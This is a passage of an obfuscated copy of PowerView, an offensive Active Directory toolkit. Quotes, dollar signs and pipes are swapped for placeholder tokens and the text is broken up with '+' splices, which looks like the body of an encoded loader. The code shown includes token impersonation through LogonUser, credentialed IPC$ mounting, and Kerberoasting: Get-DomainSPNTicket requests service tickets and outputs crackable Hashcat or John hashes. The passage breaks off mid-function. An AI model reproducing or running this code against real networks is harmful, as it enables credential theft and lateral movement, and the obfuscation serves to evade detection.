            41aSPN41a               =   11 # HTTP/kairomac.contoso.com
            41aSID41a               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }

        # accessor functions from Bill Stewart to simplify calls to NameTranslate
        function Invoke-Method([__ComObject] gIF1Object, [String] gIF1Method, gIF1Parameters) {
            gIF1Output = gIF1Null
            gIF1Output = gIF1Object.GetType().InvokeMember(gIF1Method, 41aInvokeMethod41a, gIF1NULL, gIF1Object, gIF1Parameters)
            Write-Output gIF1Output
        }

        function Get-Property([__ComObject] gIF1Object, [String] gIF1Property) {
            gIF1Object.GetType().InvokeMember(gIF1Property, 41aGetProperty41a, gIF1NULL, gIF1Object, gIF1NULL)
        }

        function Set-Property([__ComObject] gIF1Object, [String] gIF1Property, gIF1Parameters) {
            [Void] gIF1Object.GetType().InvokeMember(gIF1Property, 41aSetProperty41a, gIF1NULL, gIF1Object, gIF1Parameters)
        }

        # https://msdn.microsoft.com/en-us/library/aa772266%28v=vs.85%29.aspx
        if (gIF1PSBoundParameters[41aServer41a]) {
            gIF1ADSInitType = 2
            gIF1InitName = gIF1Server
        }
        elseif (gIF1PSBoundParameters[41aDomain41a]) {
            gIF1ADSInitType = 1
            gIF1InitName = gIF1Domain
        }
        elseif (gIF1PSBoundParameters[41aCredential41a]) {
            gIF1Cred = gIF1Credential.GetNetworkCredential()
            gIF1ADSInitType = 1
            gIF1InitName = gIF1Cred.Domain
        }
        else {
            # if no domain or server is specified, default to GC initialization
            gIF1ADSInitType = 3
            gIF1InitName ='+' gIF1Null
        }
    }

    PROCESS {
        ForEach (gIF1TargetIdentity in gIF1Identity) {
            if (-not gIF1PSBoundParameters[41aOutputType41a]) {
                if (gIF1TargetIdentity -match Zfr^[A-Za-z]+YwWYwW[A-Za-z ]+Zfr) {
                    gIF1ADSOutputType = gIF1NameTypes[41aDomainSimple41a]
                }
                else {
                    gIF1ADSOutputType = gIF1NameTypes[41aNT441a]
                }
            }
            else {
                gIF1ADSOutputType = gIF1NameTypes[gIF1OutputType]
            }

            gIF1Translate = New-Object -ComObject NameTranslate

            if (gIF1PSBoundParameters[41aCredential41a]) {
                try {
                    gIF1Cred = gIF1Credential.GetNetworkCredential()

                    Invoke-Method gIF1Translate 41aInitEx41a (
                        gIF1ADSInitType,
                        gIF1InitName,
                        gIF1Cred.UserName,
                        gIF1Cred.Domain,
                        gIF1Cred.Password
                    )
                }
                catch {
                    Write-Verbose Zfr[Convert-ADName] Error initializing translation for 41agIF1Identity41a using alternate credentials : gIF1_Zfr
                }
            }
            else {
                try {
                    gIF1Null = Invoke-Method gIF1Translate 41aInit41a (
                        gIF1ADSInitType,
                        gIF1InitName
                    )
                }
                catch {
                    Write-Verbose Zfr[Convert-ADName] Error initializing translation for 41agIF1Identity41a : gIF1_Zfr
                }
            }

            # always chase all referrals
            Set-Property gIF1Translate 41aChaseReferral41a (0x60)

            try {
                # 8 = Unknown name type -> let the server do the work for us
                gIF1Null = Invoke-Method gIF1Translate 41aSet41a (8, gIF1TargetIdentity)
                Invoke-Method gIF1Translate 41aGet41a (gIF1ADSOutputType)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose Zfr[Convert-ADName] Error translating 41agIF1TargetIdentity41a : gIF1(gIF1_.Exception.InnerException.Message)Zfr
            }
        }
    }
}


function ConvertFrom-UACValue {
<#
.SYNOPSIS

Converts a UAC int value to human readable form.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function will take an integer that represents a User Account
Control (UAC) binary blob and will covert it to an ordered
dictionary with each bitwise value broken out. By default only values
set are displayed- the -ShowAll switch will display all values with
a + next to the ones set.

.PARAMETER Value

Specifies the integer UAC value to convert.

.PARAMETER ShowAll

Switch. Signals ConvertFrom-UACValue to display all UAC values, with a + indicating the value is currently set.

.EXAMPLE

ConvertFrom-UACValue -Value 66176

Name                           Value
----                           -----
ENCRYPTED_TEXT_PWD_ALLOWED     128
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser harmj0y U9B ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser harmj0y U9B ConvertFrom-UACValue -ShowAll

Name                           Value
----                           -----
SCRIPT                         1
ACCOUNTDISABLE                 2
HOMEDIR_REQUIRED               8
LOCKOUT                        16
PASSWD_NOTREQD                 32
PASSWD_CANT_CHANGE             64
ENCRYPTED_TEXT_PWD_ALLOWED     128
TEMP_DUPLICATE_ACCOUNT         256
NORMAL_ACCOUNT                 512+
INTERDOMAIN_TRUST_ACCOUNT      2048
WORKSTATION_TRUST_'+'ACCOUNT      4096
SERVER_TRUST_ACCOUNT           8192
DONT_EXPIRE_PASSWORD           65536+
MNS_LOGON_ACCOUNT              131072
SMARTCARD_REQUIRED             262144
TRUSTED_FOR_DELEGATION         524288
NOT_DELEGATED                  1048576
USE_DES_KEY_ONLY               2097152
DONT_REQ_PREAUTH               4194304
PASSWORD_EXPIRED               8388608
TRUSTED_TO_AUTH_FOR_DELEGATION 16777216
PARTIAL_SECRETS_ACCOUNT        67108864

.INPUTS

Int

Accepts an integer representing a UAC binary blob.

.OUTPUTS

System.Collections.Specialized.OrderedDictionary

An ordered dictionary with the converted UAC fields.

.LINK

https://support.microsoft.com/en-us/kb/305144
#>

    [OutputType(41aSystem.Collections.Specialized.OrderedDictionary41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = gIF1True, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aUAC41a, 41auseraccountcontrol41a)]
        [Int]
        gIF1Value,

        [Switch]
        gIF1ShowAll
    )

    BEGIN {
        # values from https'+'://support.microsoft.com/en-us/kb/305144
        gIF1UACValues = New-Object System.Collections.Specialized.OrderedDictionary
        gIF1UACValues.Add(ZfrSCRIPTZfr, 1)
        gIF1UACValues.Add(ZfrACCOUNTDISABLEZfr, 2)
        gIF1UACValues.Add(ZfrHOMEDIR_REQUIREDZfr, 8)
        gIF1UACValues.Add(ZfrLOCKOUTZfr, 16)
        gIF1UACValues.Add(ZfrPASSWD_NOTREQDZfr, 32)
        gIF1UACValues.Add(ZfrPASSWD_CANT_CHANGEZfr, 64)
        gIF1UACValues.Add(ZfrENCRYPTED_TEXT_PWD_ALLOWEDZfr, 128)
        gIF1UACValues.Add(ZfrTEMP_DUPLICATE_ACCOUNTZfr, 256)
        gIF1UACValues.Add(ZfrNORMAL_ACCOUNTZfr, 512)
        gIF1UACValues.Add(ZfrINTERDOMAIN_TRUST_ACCOUNTZfr, 2048)
        gIF1UACValues.Add(ZfrWORKSTATION_TRUST_ACCOUNTZfr, 4096)
        gIF1UACValues.Add(ZfrSERVER_TRUST_ACCOUNTZfr, 8192)
        gIF1UACValues.Add(ZfrDONT_EXPIRE_PASSWORDZfr, 65536)
        gIF1UACValues.Add(ZfrMNS_LOGON_ACCOUNTZfr, 131072)
        gIF1UACValues.Add(ZfrSMARTCARD_REQUIREDZfr, 262144)
        gIF1UACValues.Add(ZfrTRUSTED_FOR_DELEGATIONZfr, 524288)
        gIF1UACValues.Add(ZfrNOT_DELEGATEDZfr, 1048576)
        gIF1UACValues.Add(ZfrUSE_DES_KEY_ONLYZfr, 2097152)
        gIF1UACValues.Add(ZfrDONT_REQ_PREAUTHZfr, 4194304)
        gIF1UACValues.Add(ZfrPASSWORD_EXPIREDZfr, 8388608)
        gIF1UACValues.Add(ZfrTRUSTED_TO_AUTH_FOR_DELEGATIONZfr, 16777216)
        gIF1UACValues.Add(ZfrPARTIAL_SECRETS_ACCOUNTZfr, 67108864)
    }

    PROCESS {
        gIF1ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary

  '+'      if (gIF1S'+'howAll) {
            ForEach (gIF1UACValue in gIF1UACValues.GetEnumerator()) {
                if ( (gIF1Value -band gIF1UACValue.Value) -eq gIF1UACValue.Value) {
                    gIF1ResultUACValues.Add(gIF1UACValue.Name, ZfrgIF1(gIF1UACValue.Value)+Zfr)
                }
                else {
                    gIF1ResultUACValues.Add(gIF1UACValue.Name, ZfrgIF1(gIF1UACValue.Value)Zfr)
                }
            }
        }
        e'+'lse {
            ForEach (gIF1UACValue in gIF1UACValues.GetEnumerator()) {
                if ( (gIF1Value -band gIF1UACValue.Value) -eq gIF1UACValue.Value) {
                    gIF1'+'ResultUACValues.Add(gIF1UACValue.Name, ZfrgIF1(gIF1UACValue.Value)Zfr)
                }
            }
        }
        gIF1ResultUACValues
    }
}


function Get-PrincipalContext {
<#
.SYNOPSIS

Helper to take an Identity and return a DirectoryServices.AccountManagement.PrincipalContext
and simplified identity.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.PARAMETER Identity

A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202),
or a DOMAINYwWusername identity.

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = gIF1True)]
        [Alias(41aGroupName41a, 41aGroupIdentity41a)]
        [String]
        gIF1Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    try {
        if (gIF1PSBoundParameters[41aDomain41a] -or (gIF1Identity -match 41a.+YwWYwW.+41a)) {
            if (gIF1Identity -match 41a.+YwWYwW.+41a) {
                # DOMAINYwWgroupname
                gIF1ConvertedIdentity = gIF1Identity U9B Convert-ADName -OutputType Canonical
                if (gIF1ConvertedIdentity) {
                    gIF1ConnectTarget = gIF1ConvertedIdentity.SubString(0, gIF1ConvertedIdentity.IndexOf(41a/41a))
                    gIF1ObjectIdentity = gIF1Identity.Split(41aYwW41a)[1]
                    Write-Verbose Zfr[Get-PrincipalContext] Binding to domain 41agIF1ConnectTarget4'+'1aZfr
                }
            }
            else {
                gIF1ObjectIdentity = gIF1Identity
                Write-Verbose Zfr[Get-PrincipalContext] Binding to domain 41agIF1Domain41aZfr
                gIF1ConnectTarget = gIF1Domain
            }

            if (gIF1PSBoundParameters[41aCredential41a]) {
                Write-Verbose 41a[Get-PrincipalContext] Using alternate credentials41a
                gIF1Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, gIF1ConnectTarget, gIF1Credential.UserName, gIF1Credential.GetNetworkCredential().Password)
            }
            else {
                gIF1Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, gIF1ConnectTarget)
            }
        }
        else {
            if (gIF1PSBoundParameters[41aCredential41a]) {
                Write-Verbose 41a[Get-PrincipalContext] Using alternate credentials41a
                gIF1DomainName = Get-Domain U9B Select-Object -ExpandProperty Name
                gIF1Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, gIF1DomainName, gIF1Credential.UserName, gIF1Credential.GetNetworkCredential().Password)
            }
            else {
                gIF1Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            gIF1ObjectIdentity = gIF1Identity
        }

        gIF1Out = New-Object PSObject
        gIF1Out U9B Add-Member Noteproperty 41aContext41a gIF1Context
        gIF1Out U9B Add-Member Noteproperty 41aIdentity41a gIF1ObjectIdentity
        gIF1Out
    }
    catch {
        Write-Warning Zfr[Get-PrincipalContext] Error creating binding for object (41agIF1Identity41a) context : gIF1_Zfr
    }
}


function Add-RemoteConnection {
<#
.SYNOPSIS

Pseudo ZfrmountsZfr a connection to a remote path using the specified
credential object, allowing for access of remote resources. If a -Path isn41at
specified, a -ComputerName is required to pseudo-mount IPCgIF1.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses WNetAddConnection2W to make a 41atemporary41a (i.e. not saved) conne'+'ction
to the specified remote -Path (YwWYwWUNCYwWshare) with the alternate credentials specified in the
-Credential object. If a -Path isn41at specified, a -ComputerName is required to pseudo-mount IPCgIF1.

To destroy the connection, use Remove-RemoteConnection with the same specified YwWYwWUNCYwWshare path
or -ComputerName.

.PARAMETER ComputerName

Specifies the system to add a YwWYwWComputerNameYwWIPCgIF1 connection for.

.PARAMETER Path

Specifies the remote YwWYwWUNCYwWpath to add the connection for.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

gIF1Cred = Get-Credential
Add-RemoteConnection -ComputerName 41aPRIMARY.testlab.local41a -Credential gIF1Cred

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Add-RemoteConnection -Path 41aYwWYwWPRIMARY.testlab.localYwWCgIF1YwW41a -Credential gIF1Cred

.EXAMPLE

gIF1Cred = Get-Credential
@(41aPRIMARY.testlab.local41a,41aSECONDARY.testlab.local41a) U9B Add-RemoteConnection  -Credential gIF1Cred
#>

    [CmdletBinding(DefaultParameterSetName = 41aComputerName41a)]
    Param(
        [Parameter(Position = 0, Mandatory = gIF1True, ParameterSetName = 41aComputerName41a, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName,

        [Parameter(Position = 0, ParameterSetName = 41aPath41a, Mandatory = gIF1True)]
        [ValidatePattern(41aYwWYwWYwWYwW.*YwWYwW.*41a)]
        [String[]]
        gIF1Path,

        [Parameter(Mandatory'+' = gIF1True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttrib'+'ute()]
        gIF1Credential
    )

    BEGIN {
        gIF1NetResourceInstance = [Activator]::CreateInstance(gIF1NETRESOURCEW)
        gIF1NetResourceInstance.dwType = 1
    }

    PROCESS {
        gIF1Paths = @()
        if (gIF1PSBoundParameters[41aComputerName41a]) {
            ForEach (gIF1TargetComputerName in gIF1ComputerName) {
                gIF1TargetComputerName = gIF1TargetComputerName.Trim(41aYwW41a)
                gIF1Paths += ,ZfrYwWYwWgIF1TargetComputerNameYwWIPCgIF1Zfr
            }
     '+'   }
        else {
            gIF1Paths += ,gIF1Path
        }

        ForEach (gIF1TargetPath in gIF1Paths) {
            gIF1NetResourceInstance.lpRemoteName = '+'gIF1TargetPath
            Write-Verbose Zfr[Add-RemoteConnection] Attempting to mount: gIF1TargetPathZfr

            # https://msdn.microsoft.com/en-us/library/windows/desktop/aa385413(v=vs.85).aspx
            #   CONNECT_TEMPORARY = 4
            gIF1Result = gIF1Mpr::WNetAddConnection2W(gIF1NetResourceInstance, gIF1Credential.GetNetworkCredential().Password, gIF1Credential.UserName, 4)

            if (gIF1Result -eq 0) {
                Write-Verbose ZfrgIF1TargetPath successfully mountedZfr
            }
            else {
                Throw Zfr[Add-RemoteConnection] error mounting gIF1TargetPath : gIF1(([ComponentModel.Win32Exception]gIF1Result).Message)Zfr
            }
        }
    }
}


function Remove-RemoteConnection {
<#
.SYNOPSIS

Destroys a connection created by New-RemoteConnection.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSRefle'+'ct  

.DESCRIPTION

This function uses WNetCancelConnection2 to destroy a connection created by
New-RemoteConnection. If a -Path isn41at specified, a -ComputerName is required to
41aunmount41a YwWYwWgIF1ComputerNameYwWIPCgIF1.

.PARAMETER ComputerName

Specifies the system to remove a YwWYwWComputerNameYwWIPCgIF1 connection for.

.PARAMETER Path

Specifies the remote YwWYwWUNCYwWpath to remove the connection for.

.EXAMPLE

Remove-RemoteConnection -ComputerName 41aPRIMARY.testlab.local41a

.EXAMPLE

Remove-RemoteConnection -Path 41aYwWYwWPRIMARY.testlab.localYwWCgIF1YwW41a

.EXAMPLE

@(41aPRIMARY.testlab.local41a,41aSECONDARY.testlab.local41a) U9B Remove-RemoteConnection
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseShouldProcessForStateChangingFunctions41a, 41a41a)]
    [CmdletBinding(DefaultParameterSetName = 41aComputerName41a)]
    Param(
        [Parameter(Position = 0, Mandatory = gIF1True, ParameterSetName = 41aComputerName41a, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aHostName41a, 41adnshostname41a, 41aname41a)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ComputerName,

        [Parameter(Position = 0, ParameterSetName = 41aPath41a, Mandatory = gIF1True)]
        [ValidatePattern(41aYwWYwWYwWYwW.*YwWYwW.*41a)]
        [String[]]
        gIF1Path
    )

    PROCESS {
        gIF1Paths = @()
        if (gIF1PSBoundParameters[41aComputerName41a]) {
            ForEach (gIF1TargetComputerName in gIF1ComputerName) {
                gIF1TargetComputerName = gIF1TargetComputerName.Trim(41aYwW41a)
                gIF1Paths += ,ZfrYwWYwWgIF1TargetComputerNameYwWIPCgIF1Zfr
            }
        }
        else {
            gIF1Paths += ,gIF1Path
        }

        ForEach (gIF1TargetPath in gIF1Paths) {
            Write-Verbose Zfr[Remove-RemoteConnection] '+'Attempting to unmount: gIF1TargetPathZfr
            gIF1Result = gIF1Mpr::WNetCancelConnection2(gIF1TargetPath, 0, gIF1True)

            if (gIF1Result -eq 0) {
                Write-Verbose ZfrgIF1TargetPath successfully ummountedZfr
            }
            else {
                Throw Zfr[Remove-RemoteConnection] error unmounting gIF1TargetPath : gIF1(([ComponentModel.Win32Exception]gIF1Result).Message)Zfr
            }
        }
    }
}


function Invoke-UserImpersonation {
<#
.SYNOPSIS

Creates a new Zfrrunas /netonlyZfr type logon and impersonates the token.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses LogonUser() with the LOGON32_LOGON_NEW_CREDENTIALS LogonType
to simulate Zfrrunas /netonlyZfr. The resulting token is then impersonated with
ImpersonateLoggedOnUser() and the token handle is returned for later usage
with Invoke-RevertToSelf.

.PARAMETER Credent'+'ial

A [Management.Automation.PSCredential] object with alternate credentials
to impersonate in the current thread space.

.PARAMETER TokenHandle

An IntPtr TokenHandle returned by a previous Invoke-UserImpersonation.
If this is supplied, LogonUser() is skipped and only ImpersonateLoggedOnUser()
is executed.

.PARAMETER Quiet

Suppress any warnings about STA vs MTA.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Invoke-UserImpersonation -Credential gIF1Cred

.OUTPUTS

IntPtr

The TokenHandle result from LogonUser.
#>

    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 41aCredential41a)]
    Param(
        [Parameter(Mandatory = gIF1True, ParameterSetName = 41aCredential41a)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential,

        [Parameter(Mandatory = gIF1True, ParameterSetName = 41aTokenHandle41a)]
        [ValidateNotNull()]
        [IntPtr]
        gIF1TokenHandle,

        [Switch]
        gIF1Quiet
    )

    if ((['+'System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 41aSTA41a) -and (-not gIF1PSBoundParameters[41aQuiet41a])) {
        Write-Warning Zfr[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work.Zfr
    }

    if (gIF1PSBoundParameters[41aTokenHandle41a]) {
        gIF1LogonTokenHandle = gIF1TokenHandle
    }
    else {
        gIF1LogonTokenHandle = [IntPtr]::Zero
        gIF1NetworkCredential = gIF1Credential.GetNetworkCredential()
        gIF1UserDomain = gIF1NetworkCredential.Domain
        gIF1UserName = gIF1NetworkCredential.UserName
        Write-Warning Zfr[Invoke-UserImpersonation] Executing LogonUser() with user: gIF1(gIF1UserDomain)YwWgIF1(gIF1UserName)Zfr

        # LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3
        #   this is to simulate Zfrrunas.exe /netonlyZfr functionality
        gIF1Result = gIF1Advapi32::LogonUser(gIF1UserName, gIF1UserDomain, gIF1NetworkCredential.Password, 9, 3, [ref]gIF1LogonTokenHandle);gIF1LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not gIF1Result) {
            throw Zfr[Invoke-UserImpersonation] LogonUser() Error: gIF1(([ComponentModel.Win32Exception] gIF1LastError).Message)Zfr
        }
    }

    # actually impersonate the token from LogonUser()
    gIF1Result = gIF1Advapi32::ImpersonateLoggedOnUser(gIF1LogonTokenHandle)

    if (-not gIF1Result) {
        throw Zfr[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: gIF1(([ComponentModel.Win32Exception] gIF1LastError).Message)Zfr
    }

    Write-Verbose Zfr[Invoke-UserImpersonation] Alternate credentials successfully impersonatedZfr
    gIF1LogonTokenHandle
}


function Invoke-RevertToSelf {
<#
.SYNOPSIS

Reverts any token impersonation.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function uses RevertToSelf() to revert any impersonated tokens.
If -TokenHandle is passed (the token handle returned by Invoke-UserImpersonation),
CloseHandle() is used to close the opened handle.

.PARAMETER TokenHandle

An optional IntPtr TokenHandle returned by Invoke-UserImpersonation.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
gIF1Token = Invoke-UserImpersonation -Credential gIF1Cred
Invoke-RevertToSelf -TokenHandle gIF1Token
#>

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        gIF1TokenHandle
    )

    if (gIF1PSBoundParameters[41aTokenHandle41a]) {
        Write-Warning Zfr[Invoke-RevertToSelf] Re'+'verting token impersonation and closing LogonUser() token handleZfr
        gIF1Result = gIF1Kernel32::CloseHandle(gIF1TokenHandle)
    }

    gIF1Result = gIF1Advapi32::RevertToSelf();gIF1LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not gIF1Result) {
        throw Zfr[Invoke-RevertToSelf] RevertToSelf() Error: gIF1(([ComponentModel.Win32Exception] gIF1LastError).Message)Zfr
    }

    Write-Verbose Zfr[Invoke-RevertToSelf] Token impersonation successfully revertedZfr
}


function Get-DomainSPNTicket {
<#
.SYNOPSIS

Request the kerberos ticket for a specified service principal name (SPN).

Author: machosec, Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will either take one/more SPN strings, or one/more PowerView.User objects
(the output from Get-DomainUser) and will request a kerberos ticket for the given SPN
using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted
portion of the ticket is then extracted and output in either crackable John or Hashcat
format (deafult of Hashcat).

.PARAMETER SPN

Specifies the service principal name to request the ticket for.

.PARAMETER User

Specifies a PowerView.User object (result of Get-DomainUser) to request the ticket for.

.PARAMETER OutputFormat

Either 41aJohn41a for John the Ripper style hash formatting, or 41aHashcat41a for Hashcat format.
Defaults to 41aJohn41a.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote domain using Invoke-UserImpersonation.

.EXAMPLE

Get-DomainSPNTicket -SPN ZfrHTTP/web.testlab.localZfr

Request a kerberos service ticket for the specified SPN.

.EXAMPLE

ZfrHTTP/web1.testlab.localZfr,ZfrHTTP/web2.testlab.localZfr U9B Get-DomainSPNTicket

Request kerberos service tickets for all SPNs passed on the pipeline.

.EXAMPLE

Get-DomainUser -SPN U9B Get-DomainSPNTicket -OutputFormat JTR

Request kerberos service tickets for all users with non-null SPNs and output in JTR format.

.INPUTS

String

Accepts one or more SPN strings on the pipeline with the RawSPN parameter set.

.INPUTS

PowerView.User

Accepts one or more PowerView.User objects '+'on the pipeline with the User parameter set.

.OUTPUTS

PowerView.SPNTicket

Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
#>

    [OutputType(41aPowerView.SPNTicket41a)]
    [CmdletBinding(DefaultParameterSetName = 41aRawSPN41a)]
    Param (
        [Parameter(Position = 0, ParameterSetName = 41aRawSPN41a, Mandatory = gIF1True, ValueFromPipeline = gIF1True)]
        [ValidatePattern(41a.*/.*41a)]
        [Alias(41aServicePrincipalName41a)]
        [String[]]
        gIF1SPN,

        [Parameter(Position = 0, ParameterSetName = 41aUser41a, Mandatory = gIF1True, ValueFromPipeline = gIF1True)]
        [ValidateScript({ gIF1_.PSObject.TypeNames[0] -eq 41aPowerView.User41a })]
        [Object[]]
        gIF1User,

        [ValidateSet(41aJohn41a, 41aHashcat41a)]
        [Alias(41aFormat41a)]
        [String]
        gIF1OutputFormat = 41aHashcat41a,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1Null = [Reflection.Assembly]::LoadWithPartialName(41aSystem.IdentityModel41a)

        if (gIF1PSBoundParameters[41aCredential41a]) {
            gIF1LogonToken = Invoke-UserImpersonation -Credential gIF1Credential
        }
    }

    PROCESS {
        if (gIF1PSBoundParameters[41aUser41a]) {
            gIF1TargetObject = gIF1User
        }
        else {
            gIF1TargetObject = gIF1SPN
        }

        ForEach (gIF1Object in gIF1TargetObject) {
            if (gIF1PSBoundParameters[41aUser41a]) {
                gIF1UserSPN = gIF1Object.ServicePrincipalName
                gIF1SamAccountName = gIF1Object.SamAccountName
                gIF1DistinguishedName = gIF1Object.DistinguishedName
            }
            else {
                gIF1UserSPN = gIF1Object
                gIF1SamAccountName = 41aUNKNOWN41a
                gIF1DistinguishedName = 41aUNKNOWN41a
            }

            # if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :) -@st3r30byt3
            if (gIF1UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                gIF1UserSPN = gIF1UserSPN[0]
            }

            try {
                gIF1Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList gIF1UserSPN
            }
            catch {
                Write-Warning Zfr[Get-DomainSPNTicket] Error requesting ticket for SPN 41agIF1UserSPN41a from user 41agIF1DistinguishedName41a : gIF1_Zfr
            }
            if (gIF1Ticket) {
                gIF1TicketByteStream = gIF1Ticket.GetRequest()
            }
            if (gIF1TicketByteStream) {
                gIF1Out = New-Object PSObject

                gIF1TicketHexStream = [System.BitConverter]::ToString(gIF1TicketByteStream) -replace 41a-41a

                gIF1Out U9B Add-Member Noteproperty 41aSamAccountName41a gIF1SamAccountName
                gIF1Out U9B Add-Member Noteproperty 41aDistinguishedName41a gIF1DistinguishedName
                gIF1Out U9B Add-Member Noteproperty 41aServicePrincipalName41a gIF1Ticket.ServicePrincipalName

                # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
                # No easy way to parse ASN1, so we41all try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
                if(gIF1TicketHexStream -match 41aa382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)41a) {
                    gIF1Etype = [Convert]::ToByte( gIF1Matches.EtypeLen, 16 )
                    gIF1CipherTextLen = [Convert]::ToUInt32(gIF1Matches.CipherTextLen, 16)-4
                    gIF1CipherText = gIF1Matches.DataToEnd.Substring(0,gIF1CipherTextLen*2)

                    # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
                    if(gIF1Matches.DataToEnd.Substring(gIF1CipherTextLen*2, 4) -ne 41aA48241a) {
                        Write-Warning ZfrError parsing ciphertext for the SPN  gIF1(gIF1Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReqZfr
                        gIF1Hash = gIF1null
                        gIF1Out U9B Add-Member Noteproperty 41aTicketByteHexStream41a ([Bitconverter]::ToString(gIF1TicketByteStream).Replace(41a-41a,41a41a))
                    } else {
                        gIF1Hash = ZfrgIF1(gIF1CipherText.Substring(0,32))2dOgIF1gIF1(gIF1CipherText.Substring(32))Zfr
                        gIF1Out U9B Add-Member Noteproperty 41aTicketByteHexStream41a gIF1null
                    }
                } else {
                    Write-Warning ZfrUnable to parse ticket structure for the SPN  gIF1(gIF1Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReqZfr
                    gIF1Hash = gIF1null
                    gIF1Out U9B Add-Member Noteproperty 41aTicketByteHexStream41a ([Bitconverter]::ToString(gIF1TicketByteStream).Replace(41a-41a,41a41a))
                }

                if(gIF1Hash) {
                    # JTR jumbo output format - gIF1krb5tgsgIF1SPN/machine.testlab.local:63386d22d359fe...
                    if (gIF1OutputFormat -match 41aJohn41a) {
